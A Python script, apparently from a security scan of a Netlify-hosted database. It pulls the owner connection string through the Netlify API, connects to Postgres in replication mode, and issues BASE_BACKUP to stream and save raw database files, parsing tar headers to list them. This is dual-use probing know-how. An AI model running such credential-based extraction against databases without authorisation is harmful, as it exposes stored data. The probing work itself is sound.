# -*- coding: utf-8 -*-
"""BASE_BACKUP 直接泵 libpq:绕过 psycopg 高层限制,读 CopyBoth 流
pgconn.send_query + get_copy_data 循环 -> tar 流
"""
import sys, re, json, time, http.client, ssl
sys.path.insert(0, r'D:\scan\netlify_report')
from _net_creds import AUTH_HEADER

SITE_ID = '04f08ff6-f274-47ac-b6d7-5fb1e055f3b4'
ctx = ssl.create_default_context()
conn = http.client.HTTPSConnection('api.netlify.com', context=ctx, timeout=30)
conn.request('GET', '/api/v1/sites/%s/database' % SITE_ID, headers={'Authorization': AUTH_HEADER, 'Accept': 'application/json'})
r = conn.getresponse()
d = json.loads(r.read().decode('utf-8', 'replace'))
conn.close()
cs = d.get('connection_strings', {}).get('netlifydb_owner', '')
m = re.search(r'postgresql://netlifydb_owner:([^@]+)@([^/]+)/(\w+)', cs)

import psycopg
c = psycopg.connect(host=m.group(2), port=5432, dbname=m.group(3), user='netlifydb_owner', password=m.group(1),
                    sslmode='require', connect_timeout=10, replication='database', autocommit=True)
pg = c.pgconn


def pump():
    while True:
        pg.consume_input()
        if not pg.is_busy():
            return
        time.sleep(0.02)


# 发送 BASE_BACKUP(simple query 协议)
rc = pg.send_query(b"BASE_BACKUP LABEL 'probe_bb'")
print('send_query rc:', rc)

buf = b''
try:
    while True:
        pump()
        nbytes, data = pg.get_copy_data(1)
        if nbytes > 0:
            buf += data
            if len(buf) > 262144:
                break
        elif nbytes == 0:
            time.sleep(0.02)
            continue
        else:
            # -1 copy 结束
            break
except Exception as e:
    print('copy read ERR:', str(e)[:200])

print('got bytes:', len(buf))
if buf:
    names = []
    pos = 0
    while pos + 512 <= len(buf):
        hdr = buf[pos:pos + 512]
        name = hdr[:100].split(b'\0')[0].decode('utf-8', 'replace')
        if name and hdr[257:262] == b'ustar':
            names.append(name)
            try:
                size = int(hdr[124:136].strip(b'\0 ').decode() or b'0', 8)
            except Exception:
                size = 0
            pos += 512 + ((size + 511) // 512) * 512
            if len(names) >= 20:
                break
        else:
            break
    print('FILES:', names)
    print('HEAD:', buf[:200])
    with open(r'D:\scan\netlify_report\_bb_head.bin', 'wb') as f:
        f.write(buf)
# 收尾结果
try:
    pump()
    res = pg.get_result()
    print('final result status:', res.status if res else None)
except Exception as e:
    print('final ERR:', str(e)[:200])
c.close()
